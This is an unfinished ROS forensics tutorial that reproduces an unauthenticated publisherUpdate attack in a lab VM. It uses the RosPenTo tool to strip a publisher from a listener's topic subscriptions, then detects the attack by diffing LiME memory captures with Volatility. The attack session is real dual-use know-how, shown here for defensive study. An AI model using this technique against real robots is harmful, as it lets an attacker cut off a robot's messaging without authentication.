### Basic robot forensics, an unauthenticated unregistration in ROS

The tutorial will build on top of the [tutorial1 resources](../tutorial1) and will perform a forensics study on how to detect a robot (ROS) unauthenticated updates in the publishers list for specified topic.

#### Reproducing the attack
In one terminal:
```bash
roscore &
rosrun scenario1 talker &
rosrun scenario1 listener
```

In the other terminal, capture memory first:
```bash
sudo insmod /lib/modules/lime.ko "path=/home/vagrant/robot2.lime format=lime"
# to remove module:
sudo rmmod /lib/modules/lime.ko
```

and then exploit:
```bash
vagrant@vagrant-ubuntu-trusty-64:~$ rospento
RosPenTo - Penetration testing tool for the Robot Operating System(ROS)
Copyright(C) 2018 JOANNEUM RESEARCH Forschungsgesellschaft mbH
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it under certain conditions.
For more details see the GNU General Public License at <http://www.gnu.org/licenses/>.

What do you want to do?
0: Exit
1: Analyse system...
2: Print all analyzed systems
1

Please input URI of ROS Master: (e.g. http://localhost:11311/)
http://localhost:11311/

System 0: http://127.0.0.1:11311/
Nodes:
	Node 0.1: /listener (XmlRpcUri: http://10.0.2.15:54634/)
	Node 0.0: /publisher (XmlRpcUri: http://10.0.2.15:48647/)
	Node 0.2: /rosout (XmlRpcUri: http://10.0.2.15:46243/)
Topics:
	Topic 0.0: /flag (Type: std_msgs/String)
	Topic 0.1: /rosout (Type: rosgraph_msgs/Log)
	Topic 0.2: /rosout_agg (Type: rosgraph_msgs/Log)
Services:
	Service 0.3: /listener/get_loggers
	Service 0.2: /listener/set_logger_level
	Service 0.1: /publisher/get_loggers
	Service 0.0: /publisher/set_logger_level
	Service 0.4: /rosout/get_loggers
	Service 0.5: /rosout/set_logger_level
Communications:
	Communication 0.0:
		Publishers:
			Node 0.0: /publisher (XmlRpcUri: http://10.0.2.15:48647/)
		Topic 0.0: /flag (Type: std_msgs/String)
		Subscribers:
			Node 0.1: /listener (XmlRpcUri: http://10.0.2.15:54634/)
	Communication 0.1:
		Publishers:
			Node 0.0: /publisher (XmlRpcUri: http://10.0.2.15:48647/)
			Node 0.1: /listener (XmlRpcUri: http://10.0.2.15:54634/)
		Topic 0.1: /rosout (Type: rosgraph_msgs/Log)
		Subscribers:
			Node 0.2: /rosout (XmlRpcUri: http://10.0.2.15:46243/)
	Communication 0.2:
		Publishers:
			Node 0.2: /rosout (XmlRpcUri: http://10.0.2.15:46243/)
		Topic 0.2: /rosout_agg (Type: rosgraph_msgs/Log)
		Subscribers:
Parameters:
	Parameter 0.0:
		Name: /roslaunch/uris/host_vagrant_ubuntu_trusty_64__49829
	Parameter 0.1:
		Name: /rosdistro
	Parameter 0.2:
		Name: /rosversion
	Parameter 0.3:
		Name: /run_id

What do you want to do?
0: Exit
1: Analyse system...
2: Print all analyzed systems
3: Print information about analyzed system...
4: Print nodes of analyzed system...
5: Print node types of analyzed system (Python or C++)...
6: Print topics of analyzed system...
7: Print services of analyzed system...
8: Print communications of analyzed system...
9: Print communications of topic...
10: Print parameters...
11: Update publishers list of subscriber (add)...
12: Update publishers list of subscriber (set)...
13: Update publishers list of subscriber (remove)...
14: Isolate service...
15: Unsubscribe node from parameter (only C++)...
16: Update subscribed parameter at Node (only C++)...
13
To which subscriber do you want to send the publisherUpdate message?
Please enter number of subscriber (e.g.: 0.0):
0.1
Which topic should be affected?
Please enter number of topic (e.g.: 0.0):
0.0
Which publisher(s) do you want to remove?
Please enter number of publisher(s) (e.g.: 0.0,0.1,...):
0.0
sending publisherUpdate to subscriber '/listener (XmlRpcUri: http://10.0.2.15:54634/)' over topic '/flag (Type: std_msgs/String)' with publishers ''
PublisherUpdate completed successfully.

What do you want to do?
0: Exit
1: Analyse system...
2: Print all analyzed systems
3: Print information about analyzed system...
4: Print nodes of analyzed system...
5: Print node types of analyzed system (Python or C++)...
6: Print topics of analyzed system...
7: Print services of analyzed system...
8: Print communications of analyzed system...
9: Print communications of topic...
10: Print parameters...
11: Update publishers list of subscriber (add)...
12: Update publishers list of subscriber (set)...
13: Update publishers list of subscriber (remove)...
14: Isolate service...
15: Unsubscribe node from parameter (only C++)...
16: Update subscribed parameter at Node (only C++)...
0
```

then capture again:
```bash
sudo insmod /lib/modules/lime.ko "path=/home/vagrant/robot2_hacked.lime format=lime"
# to remove module:
sudo rmmod /lib/modules/lime.ko
```

#### Analyzing the captures
Reusing the `voltest.sh` script from the forensics [Tutorial 1](../tutorial1/):

```bash
vagrant@vagrant-ubuntu-trusty-64:~$ ./voltest.sh "linux_lsof"
Volatility Foundation Volatility Framework 2.6
Volatility Foundation Volatility Framework 2.6
272d271
< 0xffff88001f06b000 talker                             3480       12 socket:[19692]
284,304c283,302
< 0xffff88001f080000 listener                           3498       11 socket:[19689]
< 0xffff88001dfc6000 sudo                               3527        0 /dev/pts/1
< 0xffff88001dfc6000 sudo                               3527        1 /dev/pts/1
< 0xffff88001dfc6000 sudo                               3527        2 /dev/pts/1
< 0xffff88001dfc6000 sudo                               3527        3 socket:[19734]
< 0xffff88001dfc6000 sudo                               3527        5 socket:[19736]
< 0xffff88001dfc6000 sudo                               3527        6 pipe:[19732]
< 0xffff88001dfc6000 sudo                               3527        7 pipe:[19732]
< 0xffff88001dfc4800 insmod                             3528        0 /dev/pts/1
< 0xffff88001dfc4800 insmod                             3528        1 /dev/pts/1
< 0xffff88001dfc4800 insmod                             3528        2 /dev/pts/1
< 0xffff88001dfc4800 insmod                             3528        3 /lib/modules/lime.ko
< 0xffff88001dfc3000 systemd-udevd                      3529        0 /dev/null
< 0xffff88001dfc3000 systemd-udevd                      3529        1 /dev/null
< 0xffff88001dfc3000 systemd-udevd                      3529        2 /dev/null
< 0xffff88001dfc3000 systemd-udevd                      3529        3 anon_inode:[5259]
< 0xffff88001dfc3000 systemd-udevd                      3529        4 anon_inode:[5259]
< 0xffff88001dfc3000 systemd-udevd                      3529        6 anon_inode:[5259]
< 0xffff88001dfc3000 systemd-udevd                      3529        9 socket:[7296]
< 0xffff88001dfc3000 systemd-udevd                      3529       10 /lib/udev/hwdb.bin
< 0xffff88001dfc3000 systemd-udevd                      3529       12 socket:[19747]
---
> 0xffff8800020f4800 sudo                               3555        0 /dev/pts/1
> 0xffff8800020f4800 sudo                               3555        1 /dev/pts/1
> 0xffff8800020f4800 sudo                               3555        2 /dev/pts/1
> 0xffff8800020f4800 sudo                               3555        3 socket:[19897]
> 0xffff8800020f4800 sudo                               3555        5 socket:[19899]
> 0xffff8800020f4800 sudo                               3555        6 pipe:[19895]
> 0xffff8800020f4800 sudo                               3555        7 pipe:[19895]
> 0xffff8800020f3000 insmod                             3556        0 /dev/pts/1
> 0xffff8800020f3000 insmod                             3556        1 /dev/pts/1
> 0xffff8800020f3000 insmod                             3556        2 /dev/pts/1
> 0xffff8800020f3000 insmod                             3556        3 /lib/modules/lime.ko
> 0xffff8800020f1800 systemd-udevd                      3557        0 /dev/null
> 0xffff8800020f1800 systemd-udevd                      3557        1 /dev/null
> 0xffff8800020f1800 systemd-udevd                      3557        2 /dev/null
> 0xffff8800020f1800 systemd-udevd                      3557        3 anon_inode:[5259]
> 0xffff8800020f1800 systemd-udevd                      3557        4 anon_inode:[5259]
> 0xffff8800020f1800 systemd-udevd                      3557        6 anon_inode:[5259]
> 0xffff8800020f1800 systemd-udevd                      3557        9 socket:[7296]
> 0xffff8800020f1800 systemd-udevd                      3557       10 /lib/udev/hwdb.bin
> 0xffff8800020f1800 systemd-udevd                      3557       12 socket:[19910]
```

```bash

vagrant@vagrant-ubuntu-trusty-64:~$ ./voltest.sh "linux_netstat"
Volatility Foundation Volatility Framework 2.6
^[Volatility Foundation Volatility Framework 2.6
76d75
< TCP      10.0.2.15       :39958 10.0.2.15       :36126 ESTABLISHED                talker/3480
82,85c81,83
< TCP      10.0.2.15       :36126 10.0.2.15       :39958 ESTABLISHED              listener/3498
< UNIX 19734                 sudo/3527
< UNIX 19736                 sudo/3527
< UNIX 7296         systemd-udevd/3529
---
> UNIX 19897                 sudo/3555
> UNIX 19899                 sudo/3555
> UNIX 7296         systemd-udevd/3557

```

It seems pretty obvious that something's going on with the processes talker (PID:3480) and listener (PID:3498). Each one of them has lost one socket after the exploitation.

Let's study the sockets in more detail:
```bash
vagrant@vagrant-ubuntu-trusty-64:~$ vol.py --plugins=/vagrant/ros_volatility --profile LinuxUbuntu14045x64 -f robot2.lime linux_netstat -p 3480
Volatility Foundation Volatility Framework 2.6
TCP      127.0.0.1       :59181 127.0.0.1       :11311 CLOSE_WAIT                 talker/3480
TCP      0.0.0.0         :39958 0.0.0.0         :    0 LISTEN                     talker/3480
UDP      0.0.0.0         :45789 0.0.0.0         :    0                            talker/3480
TCP      0.0.0.0         :48647 0.0.0.0         :    0 LISTEN                     talker/3480
TCP      10.0.2.15       :39958 10.0.2.15       :36111 ESTABLISHED                talker/3480
TCP      10.0.2.15       :39958 10.0.2.15       :36126 ESTABLISHED                talker/3480
vagrant@vagrant-ubuntu-trusty-64:~$ vol.py --plugins=/vagrant/ros_volatility --profile LinuxUbuntu14045x64 -f robot2_hacked.lime linux_netstat -p 3480
Volatility Foundation Volatility Framework 2.6
TCP      127.0.0.1       :59181 127.0.0.1       :11311 CLOSE_WAIT                 talker/3480
TCP      0.0.0.0         :39958 0.0.0.0         :    0 LISTEN                     talker/3480
UDP      0.0.0.0         :45789 0.0.0.0         :    0                            talker/3480
TCP      0.0.0.0         :48647 0.0.0.0         :    0 LISTEN                     talker/3480
TCP      10.0.2.15       :39958 10.0.2.15       :36111 ESTABLISHED                talker/3480
vagrant@vagrant-ubuntu-trusty-64:~$ vol.py --plugins=/vagrant/ros_volatility --profile LinuxUbuntu14045x64 -f robot2.lime linux_netstat -p 3498
Volatility Foundation Volatility Framework 2.6
TCP      127.0.0.1       :59195 127.0.0.1       :11311 CLOSE_WAIT               listener/3498
TCP      0.0.0.0         :47722 0.0.0.0         :    0 LISTEN                   listener/3498
UDP      0.0.0.0         :45467 0.0.0.0         :    0                          listener/3498
TCP      0.0.0.0         :54634 0.0.0.0         :    0 LISTEN                   listener/3498
TCP      10.0.2.15       :47722 10.0.2.15       :52353 ESTABLISHED              listener/3498
TCP      10.0.2.15       :36126 10.0.2.15       :39958 ESTABLISHED              listener/3498
vagrant@vagrant-ubuntu-trusty-64:~$ vol.py --plugins=/vagrant/ros_volatility --profile LinuxUbuntu14045x64 -f robot2_hacked.lime linux_netstat -p 3498
Volatility Foundation Volatility Framework 2.6
TCP      127.0.0.1       :59195 127.0.0.1       :11311 CLOSE_WAIT               listener/3498
TCP      0.0.0.0         :47722 0.0.0.0         :    0 LISTEN                   listener/3498
UDP      0.0.0.0         :45467 0.0.0.0         :    0                          listener/3498
TCP      0.0.0.0         :54634 0.0.0.0         :    0 LISTEN                   listener/3498
TCP      10.0.2.15       :47722 10.0.2.15       :52353 ESTABLISHED              listener/3498
```

**Ongoing**
